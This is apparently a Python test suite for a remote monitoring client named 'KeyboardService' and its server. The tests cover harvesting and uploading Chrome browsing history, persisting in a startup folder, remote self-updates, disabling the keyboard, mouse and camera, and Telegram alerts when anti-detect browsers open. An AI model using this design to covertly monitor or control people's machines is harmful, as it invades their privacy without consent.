import sqlite3
import threading
import types
import unittest
from unittest.mock import patch

import app
import client


class BrowserHistoryTests(unittest.TestCase):
    def test_windows_filetime_to_epoch_ms(self):
        self.assertEqual(client.windows_filetime_to_epoch_ms(0), -11644473600000)
        self.assertEqual(client.windows_filetime_to_epoch_ms(13250236000000000), 1605762400000)

    def test_collect_browser_history_entries_from_sqlite(self):
        db_path = "test_history.sqlite"
        connection = sqlite3.connect(db_path)
        try:
            connection.execute(
                "CREATE TABLE urls (id INTEGER PRIMARY KEY, url TEXT, title TEXT, last_visit_time INTEGER)"
            )
            connection.execute(
                "INSERT INTO urls (url, title, last_visit_time) VALUES (?, ?, ?)",
                ("https://example.com/search?q=hello", "Example", 13250236000000000),
            )
            connection.execute(
                "INSERT INTO urls (url, title, last_visit_time) VALUES (?, ?, ?)",
                ("https://example.com/other", "Example 2", 0),
            )
            connection.commit()
        finally:
            connection.close()

        try:
            entries = client.collect_browser_history_entries("Chrome", db_path)
        finally:
            import os
            if os.path.exists(db_path):
                os.remove(db_path)

        self.assertEqual(
            entries,
            [
                {
                    "browser": "Chrome",
                    "url": "https://example.com/search?q=hello",
                    "visited_at": 1605762400000,
                }
            ],
        )

    def test_browser_name_from_active_app_handles_browser_variants(self):
        self.assertEqual(client.browser_name_from_active_app("chrome.exe - My page"), "chrome.exe")
        self.assertEqual(client.browser_name_from_active_app("C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe - Example"), "chrome.exe")
        self.assertEqual(client.browser_name_from_active_app("Microsoft Edge - Example"), "msedge.exe")
        self.assertEqual(client.browser_name_from_active_app("Google Chrome"), "chrome.exe")

    def test_sync_browser_history_uploads_recent_entries_from_last_week(self):
        recent_ms = int((client.datetime.now().astimezone() - client.timedelta(days=2)).timestamp() * 1000)
        old_ms = int((client.datetime.now().astimezone() - client.timedelta(days=12)).timestamp() * 1000)
        entries = [
            {"browser": "Chrome", "url": "https://example.com/recent", "visited_at": recent_ms},
            {"browser": "Chrome", "url": "https://example.com/old", "visited_at": old_ms},
        ]

        with patch.object(client, "browser_history_paths", return_value=[("Chrome", "C:/tmp/History")]), \
             patch.object(client, "collect_browser_history_entries", return_value=entries), \
             patch.object(client, "post_website_history", return_value=True) as post_mock:
            client.browser_history_seen.clear()
            client.sync_browser_history()

        self.assertEqual(post_mock.call_count, 1)
        self.assertEqual(post_mock.call_args_list[0].args[0], "https://example.com/recent")

    def test_recent_browser_history_url_falls_back_to_browser_db_when_ui_access_is_missing(self):
        recent_ms = int((client.datetime.now().astimezone() - client.timedelta(minutes=2)).timestamp() * 1000)
        old_ms = int((client.datetime.now().astimezone() - client.timedelta(days=2)).timestamp() * 1000)
        entries = [
            {"browser": "Chrome", "url": "https://example.com/older", "visited_at": old_ms},
            {"browser": "Chrome", "url": "https://example.com/newer", "visited_at": recent_ms},
        ]

        with patch.object(client, "browser_history_paths", return_value=[("Chrome", "C:/tmp/History")]), \
             patch.object(client, "collect_browser_history_entries", return_value=entries):
            self.assertEqual(client.latest_browser_history_url("chrome.exe - Example"), "https://example.com/newer")

    def test_save_device_keeps_client_version(self):
        app.devices.pop("dev-version-test", None)
        app.save_device("dev-version-test", "Version device", 111, 222, 333, {"client_version": "1.2.3"})
        self.assertEqual(app.devices["dev-version-test"]["client_version"], "1.2.3")
        app.devices.pop("dev-version-test", None)

    def test_save_device_keeps_client_ip(self):
        app.devices.pop("dev-ip-test", None)
        app.save_device("dev-ip-test", "IP device", 111, 222, 333, {"client_ip": "203.0.113.42"})
        self.assertEqual(app.devices["dev-ip-test"]["client_ip"], "203.0.113.42")
        app.devices.pop("dev-ip-test", None)

    def test_check_for_updates_acknowledges_before_exit(self):
        original_frozen = getattr(client.sys, "frozen", False)
        original_lock = client.update_lock
        try:
            client.sys.frozen = True
            client.update_lock = threading.Lock()
            with patch.object(client, "download_update", return_value=("C:/tmp/KeyboardService.exe", "1.2.3")), \
                 patch.object(client, "schedule_update") as schedule_mock, \
                 patch.object(client, "acknowledge_device_command") as ack_mock, \
                 patch.object(client.os, "_exit") as exit_mock:
                client.check_for_updates(command_id="cmd-123")
        finally:
            client.sys.frozen = original_frozen
            client.update_lock = original_lock

        ack_mock.assert_called_once_with("cmd-123", "completed")
        schedule_mock.assert_called_once()
        exit_mock.assert_called_once_with(0)

    def test_queue_device_command_accepts_input_controls(self):
        device_id = "input-controls-test"
        app.devices[device_id] = {"id": device_id, "name": "Input Controls Test"}
        try:
            ok, message = app.queue_device_command(device_id, "disable_keyboard", "15")
            self.assertTrue(ok)
            self.assertTrue(message)
            ok, message = app.queue_device_command(device_id, "disable_camera", "20")
            self.assertTrue(ok)
            self.assertTrue(message)
            ok, message = app.queue_device_command(device_id, "close_app", "Calculator")
            self.assertTrue(ok)
            self.assertTrue(message)
            ok, message = app.queue_device_command(device_id, "close_all_apps", "")
            self.assertTrue(ok)
            self.assertTrue(message)
        finally:
            app.devices.pop(device_id, None)

    def test_queue_device_command_accepts_update_client(self):
        device_id = "update-client-test"
        app.devices[device_id] = {"id": device_id, "name": "Update Test"}
        try:
            ok, message = app.queue_device_command(device_id, "update_client", "")
            self.assertTrue(ok)
            self.assertTrue(message)
        finally:
            app.devices.pop(device_id, None)

    def test_windows_hooks_keep_callback_references_alive(self):
        def run_worker(worker_func, lock_attr):
            class DummyUser32:
                def __init__(self):
                    self._hooked = threading.Event()
                    self._allow_exit = threading.Event()

                def SetWindowsHookExW(self, *args):
                    self._hooked.set()
                    return 123

                def GetMessageW(self, *args):
                    self._allow_exit.wait(2)
                    return 0

                def TranslateMessage(self, *args):
                    return None

                def DispatchMessageW(self, *args):
                    return None

                def UnhookWindowsHookEx(self, *args):
                    return True

            class DummyKernel32:
                def GetModuleHandleW(self, *args):
                    return 1

            original_windll = client.ctypes.windll
            original_lock = getattr(client, lock_attr)
            original_callback = getattr(client, "keyboard_hook_callback" if lock_attr == "keyboard_disable_lock" else "mouse_hook_callback", None)
            user32 = DummyUser32()
            try:
                client.ctypes.windll = types.SimpleNamespace(user32=user32, kernel32=DummyKernel32())
                client.__dict__[lock_attr] = threading.Lock()
                client.__dict__[lock_attr].acquire()
                setattr(client, "keyboard_hook_callback" if lock_attr == "keyboard_disable_lock" else "mouse_hook_callback", None)

                ready = threading.Event()
                result = {}
                worker = threading.Thread(target=worker_func, args=(1, ready, result), daemon=True)
                worker.start()
                self.assertTrue(user32._hooked.wait(2))
                if lock_attr == "keyboard_disable_lock":
                    self.assertIsNotNone(client.keyboard_hook_callback)
                else:
                    self.assertIsNotNone(client.mouse_hook_callback)
                user32._allow_exit.set()
                worker.join(2)
                self.assertFalse(worker.is_alive())
                self.assertNotIn("error", result)
            finally:
                client.ctypes.windll = original_windll
                client.__dict__[lock_attr] = original_lock
                setattr(client, "keyboard_hook_callback" if lock_attr == "keyboard_disable_lock" else "mouse_hook_callback", original_callback)

        run_worker(client.keyboard_disable_worker, "keyboard_disable_lock")
        run_worker(client.mouse_disable_worker, "mouse_disable_lock")

    def test_running_from_local_project_detects_dev_build(self):
        project_root = client.os.path.abspath(client.os.getcwd())
        project_markers = ["client.py", "KeyboardService.spec", "requirements.txt"]
        self.assertTrue(all(client.os.path.exists(client.os.path.join(project_root, marker)) for marker in project_markers))
        self.assertTrue(not getattr(client.sys, "frozen", False) or client.running_from_local_project() or client.running_from_temp_bundle())

    def test_get_startup_command_uses_installed_python_script_when_not_frozen(self):
        original_frozen = getattr(client.sys, "frozen", False)
        original_executable = client.sys.executable
        try:
            client.sys.frozen = False
            client.sys.executable = r"C:\venv\Scripts\python.exe"
            with patch.object(client, "install_self_to_startup_location", return_value=r"C:\Users\Test\AppData\Local\KeyboardService\KeyboardService.py"):
                self.assertEqual(
                    client.get_startup_command(),
                    '"C:\\venv\\Scripts\\python.exe" "C:\\Users\\Test\\AppData\\Local\\KeyboardService\\KeyboardService.py"',
                )
        finally:
            client.sys.frozen = original_frozen
            client.sys.executable = original_executable

    def test_extract_monitored_apps_detects_browsers_and_login_tools(self):
        with patch.object(app, "telegram_configured", return_value=True):
            detected = app.extract_monitored_apps([
                "Google Chrome",
                "Firefox Browser",
                "GoLogin - profile 1",
                "Notepad",
                "MoreLogin window",
            ])
        self.assertEqual(
            detected,
            ["Google Chrome", "Firefox Browser", "GoLogin - profile 1", "MoreLogin window"],
        )

    def test_notify_app_open_alerts_only_once_per_device_per_app(self):
        app.app_open_alerts.clear()
        with patch.object(app, "telegram_configured", return_value=True), \
             patch.object(app, "send_telegram_message") as message_mock:
            app.notify_app_open_alerts("dev-1", "Machine A", ["Google Chrome", "Notepad"])
            app.notify_app_open_alerts("dev-1", "Machine A", ["Google Chrome", "Notepad"])
            app.notify_app_open_alerts("dev-1", "Machine A", ["Firefox Browser"])
        self.assertEqual(message_mock.call_count, 2)

    def test_send_message_falls_back_to_recent_browser_url(self):
        with patch.object(client, "get_browser_url", return_value=""), \
             patch.object(client, "latest_browser_history_url", return_value="https://example.com/search?q=hello"):
            payload = client.send_message("hi", "chrome.exe - Example", "")
        self.assertEqual(payload["source_url"], "https://example.com/search?q=hello")

    def test_matches_monitored_site_url_uses_configurable_allowlist(self):
        original_patterns = app.MONITORED_SITE_PATTERNS
        try:
            app.MONITORED_SITE_PATTERNS = ["example.com", "github.com"]
            self.assertTrue(app.matches_monitored_site_url("https://www.example.com/login?x=1"))
            self.assertTrue(app.matches_monitored_site_url("https://github.com/shadrackkiptoo"))
            self.assertFalse(app.matches_monitored_site_url("https://google.com/search?q=hello"))
        finally:
            app.MONITORED_SITE_PATTERNS = original_patterns

    def test_notify_monitored_site_alerts_only_once_per_site(self):
        original_patterns = app.MONITORED_SITE_PATTERNS
        original_alerts = app.site_open_alerts.copy()
        try:
            app.MONITORED_SITE_PATTERNS = ["example.com"]
            app.site_open_alerts.clear()
            with patch.object(app, "telegram_configured", return_value=True), \
                 patch.object(app, "send_telegram_message") as message_mock:
                app.notify_monitored_site_alerts("dev-1", "Machine A", "https://www.example.com/login")
                app.notify_monitored_site_alerts("dev-1", "Machine A", "https://www.example.com/login")
                app.notify_monitored_site_alerts("dev-1", "Machine A", "https://google.com/search")
            self.assertEqual(message_mock.call_count, 1)
        finally:
            app.MONITORED_SITE_PATTERNS = original_patterns
            app.site_open_alerts = original_alerts

    def test_extract_monitored_apps_uses_custom_app_patterns(self):
        original_patterns = app.MONITORED_APP_PATTERNS
        try:
            app.MONITORED_APP_PATTERNS = ["chrome", "gologin"]
            detected = app.extract_monitored_apps(["Google Chrome", "Notepad", "GoLogin Profile", "Firefox"])
            self.assertEqual(detected, ["Google Chrome", "GoLogin Profile"])
        finally:
            app.MONITORED_APP_PATTERNS = original_patterns


if __name__ == "__main__":
    unittest.main()
